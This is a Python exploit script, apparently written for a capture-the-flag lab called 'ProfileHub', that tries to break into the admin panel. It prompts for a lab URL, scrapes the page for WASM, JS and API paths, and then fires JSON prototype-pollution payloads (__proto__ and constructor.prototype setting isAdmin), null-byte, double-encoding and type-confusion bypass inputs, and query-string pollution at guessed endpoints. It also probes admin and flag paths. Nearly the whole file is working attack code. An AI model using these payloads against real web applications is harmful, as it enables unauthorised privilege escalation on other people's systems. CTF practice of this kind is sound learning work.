#!/usr/bin/env python3
"""
ProfileHub v2.4.1 - WASM Prototype Pollution Exploit
Challenge: Bypass WASM input validator to access admin panel
Flag format: ctf7{w4sm_pr0t0_p0llut10n_ch41n_*}
"""

import requests
import json
import re

# Lab URL - update this with actual URL
LAB_URL = input("Enter the lab URL: ").strip()
if not LAB_URL.startswith('http'):
    LAB_URL = 'http://' + LAB_URL

print(f"[*] ProfileHub WASM Prototype Pollution Exploit")
print(f"[*] Target: {LAB_URL}")
print("=" * 70)

session = requests.Session()

# 1. Initial reconnaissance
print("\n[1] Reconnaissance...")
try:
    r = session.get(LAB_URL)
    print(f"[+] Status: {r.status_code}")
    
    # Look for WASM files
    wasm_files = re.findall(r'["\']([^"\']*\.wasm)["\']', r.text)
    js_files = re.findall(r'["\']([^"\']*\.js)["\']', r.text)
    
    if wasm_files:
        print(f"[+] Found WASM files: {wasm_files}")
    if js_files:
        print(f"[+] Found JS files: {js_files}")
    
    # Check for API endpoints
    api_endpoints = re.findall(r'["\']/(api/[^"\']*)["\']', r.text)
    if api_endpoints:
        print(f"[+] Found API endpoints: {set(api_endpoints)}")
    
except Exception as e:
    print(f"[-] Error: {e}")

# 2. Common prototype pollution payloads for WASM bypass
print("\n[2] Testing prototype pollution payloads...")

# Prototype pollution payloads
payloads = [
    # Standard prototype pollution
    {"__proto__": {"isAdmin": True}},
    {"__proto__": {"admin": True}},
    {"__proto__": {"role": "admin"}},
    {"constructor": {"prototype": {"isAdmin": True}}},
    
    # Nested pollution
    {"__proto__": {"__proto__": {"isAdmin": True}}},
    
    # Array-based pollution
    {"__proto__[isAdmin]": True},
    
    # JSON pollution
    '{"__proto__":{"isAdmin":true}}',
    
    # URL-encoded pollution
    "__proto__[isAdmin]=true",
    
    # Deep merge pollution
    {"profile": {"__proto__": {"isAdmin": True}}},
    
    # Constructor pollution
    {"constructor": {"prototype": {"admin": True}}},
]

# Common endpoints to test
endpoints = [
    '/api/profile',
    '/api/user',
    '/api/update',
    '/api/validate',
    '/profile',
    '/update',
    '/admin',
    '/api/admin',
]

for endpoint in endpoints:
    url = LAB_URL + endpoint
    print(f"\n  Testing {endpoint}...")
    
    for payload in payloads[:5]:  # Test first 5 payloads per endpoint
        try:
            # Try POST
            r = session.post(url, json=payload, timeout=5)
            if r.status_code == 200:
                if 'ctf7{' in r.text:
                    print(f"\n[+] FLAG FOUND!")
                    flags = re.findall(r'ctf7\{[^}]+\}', r.text)
                    for flag in flags:
                        print(f"    {flag}")
                elif 'admin' in r.text.lower() or 'flag' in r.text.lower():
                    print(f"[+] Interesting response from POST {endpoint}:")
                    print(f"    {r.text[:200]}")
        except:
            pass

# 3. Try bypassing WASM validator with special characters
print("\n[3] Testing WASM validator bypass...")

bypass_payloads = [
    # Null byte injection
    {"name": "admin\x00", "role": "user"},
    
    # Unicode bypass
    {"name": "admin\u0000", "role": "user"},
    
    # Double encoding
    {"name": "%2561dmin", "role": "user"},
    
    # Case manipulation
    {"Name": "admin", "ROLE": "admin"},
    
    # Array confusion
    {"name": ["admin"], "role": ["admin"]},
    
    # Object confusion
    {"name": {"toString": "admin"}, "role": "admin"},
]

for payload in bypass_payloads:
    try:
        r = session.post(LAB_URL + '/api/profile', json=payload, timeout=5)
        if 'ctf7{' in r.text:
            print(f"[+] FLAG FOUND with bypass payload!")
            flags = re.findall(r'ctf7\{[^}]+\}', r.text)
            for flag in flags:
                print(f"    {flag}")
    except:
        pass

# 4. Check for admin panel directly
print("\n[4] Checking admin panel...")
admin_paths = [
    '/admin',
    '/admin.html',
    '/admin/panel',
    '/admin/dashboard',
    '/api/admin',
    '/api/admin/flag',
    '/flag',
    '/api/flag',
]

for path in admin_paths:
    try:
        r = session.get(LAB_URL + path, timeout=5)
        if r.status_code == 200:
            print(f"[+] {path} accessible!")
            if 'ctf7{' in r.text:
                print(f"[+] FLAG FOUND!")
                flags = re.findall(r'ctf7\{[^}]+\}', r.text)
                for flag in flags:
                    print(f"    {flag}")
    except:
        pass

# 5. Try polluting via query parameters
print("\n[5] Testing query parameter pollution...")
pollution_params = [
    '?__proto__[isAdmin]=true',
    '?constructor[prototype][isAdmin]=true',
    '?__proto__.isAdmin=true',
    '?admin=true',
]

for param in pollution_params:
    try:
        r = session.get(LAB_URL + param, timeout=5)
        if 'ctf7{' in r.text:
            print(f"[+] FLAG FOUND with param: {param}")
            flags = re.findall(r'ctf7\{[^}]+\}', r.text)
            for flag in flags:
                print(f"    {flag}")
    except:
        pass

print("\n" + "=" * 70)
print("[*] Exploit complete!")
print("\n[!] If no flag found, try:")
print("    1. Download and analyze the WASM file")
print("    2. Use browser DevTools to inspect WASM module")
print("    3. Look for client-side validation bypass")
print("    4. Check for race conditions in validation")
